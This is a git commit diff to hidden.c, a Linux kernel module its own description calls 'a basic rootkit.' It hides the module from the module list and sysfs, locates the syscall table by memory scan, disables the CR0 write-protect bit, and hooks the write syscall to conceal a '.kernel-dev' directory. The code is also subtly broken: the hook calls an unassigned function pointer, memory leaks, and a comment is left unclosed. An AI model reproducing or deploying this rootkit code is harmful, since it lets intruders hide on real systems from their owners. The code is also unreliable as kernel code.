b2dc5170b1cb4d41b0c5dedea1c3e29a8853f723
RichardKavanagh <richard.kavanagh7@mail.dcu.ie>
2015-02-08 01:11:32 +0000

    Added write system call interception to hide directories from being displayed.

--- hidden.c
+++ hidden.c
@@ -1,15 +1,29 @@
-#include <linux/module.h> // Included for all kernel modules
-#include <linux/kernel.h> // Included for KERN_INFO
-#include <linux/init.h> // Included for __init and __exit macros
-#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> misc
+#include <linux/module.h> // Included for all kernel modules.
+#include <linux/kernel.h> // Included for KERN_INFO.
+#include <linux/init.h> // Included for __init and __exit macros.
+#include <linux/slab.h> // For usage of kmalloc.
+#include <asm/paravirt.h> // For usage of Read_cr0 and Write_cr0.
+#include <linux/syscalls.h> 
+#include <linux/kobject.h>
+#include <linux/unistd.h>
+#include <linux/string.h>
 
- 
+
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Richard <richard.kavanagh7@mail.dcu.ie>");
+MODULE_AUTHOR("Richard Kavanagh <richard.kavanagh7@mail.dcu.ie>");
 MODULE_DESCRIPTION("A basic rootkit.");
 
 
+
+/* Old stystem call function prototype. */
+asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);
+
+/* Our new system call function prototype.  */
+asmlinkage ssize_t hidden_write(int fd, const char __user *buff, size_t count);
+
+
 unsigned long **sys_call_table;
+
 
 static unsigned long **get_sys_call_table(void)
 {
@@ -21,9 +35,9 @@ static unsigned long **get_sys_call_table(void)
     while (offset < ULLONG_MAX) {
       
         sct = (unsigned long **)offset;
-        /* Searching for bit pattern that matches sct[__NR_close] */
+        /* Searching for bit pattern that matches sct[__NR_close]. */
         if (sct[__NR_close] == (unsigned long *) sys_close) {
-            printk("Syscall table found at: %lx\n", offset);
+            printk(KERN_INFO "Syscall table found at: %lx\n", offset);
             return sct;
         }
 
@@ -33,26 +47,70 @@ static unsigned long **get_sys_call_table(void)
 }
 
 
+asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
+
+asmlinkage ssize_t hidden_write(int fd, const char __user *buff, size_t count) {
+
+    char *protected_name = ".kernel-dev";
+    char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* Allocate kernel memory for memory from userland. */
+    copy_from_user(kbuff,buff,255); /* Copy the userland moduleemory to the kernel memory allocation. */
+
+    /* Check does the write contain the protected directory name. */
+    if (strstr(kbuff,protected_name)) { 
+        kfree(kbuff);
+        /* Hide ls write error with ENOTDIR/ENOENT and return file exists error. */
+        return EEXIST; 
+    }
+    /* Otherwise return data from original write system call. */
+    return o_write(fd,buff,count); 
+
+}
+
+
 static int __init hidden_init(void)
 {
 
     printk(KERN_INFO "Starting up module.\n");
 
-    /* Hide the module from proc/modules, Sys/modules tracking */
+    /*
+    /* Hide the module from proc/modules, Sys/modules tracking. */
     list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
+    /* Locate address of the Syscall table in memory. */
     if(!(sys_call_table = get_sys_call_table())) {
-        printk(KERN_INFO "Unable to locate Syscall table, removing module");
-        // Non-zero return means that the module couldn't be loaded.
+        printk(KERN_INFO "Unable to locate Syscall table.");
         return -1;
     }
+
+    /* Disabling WP bit in control register cr0 to write to sys_call table. */
+    write_cr0(read_cr0() & (~ 0x10000));
+
+    /* Storing the system to restore it after */
+    ref_sys_write = (void *)sys_call_table[__NR_write];
+
+    // write our modified read call to the syscall table
+    sys_call_table[__NR_write] = (unsigned long *)hidden_write;
+
+    /* Turning WP bit back on. */
+    write_cr0(read_cr0() | 0x10000); 
+
     return 0; 
 }
  
 static void __exit hidden_cleanup(void)
 {
     printk(KERN_INFO "Cleaning up module.\n");
+
+     /* Disabling WP bit in control register cr0 to revert changes. */
+    write_cr0(read_cr0() & (~ 0x10000));
+
+    //xchg(&sys_call_table[__NR_write],o_write);
+
+    sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
+
+    /* Revert cr0 to WP only. */
+    write_cr0(read_cr0() | 0x10000); 
 }
  
 module_init(hidden_init);
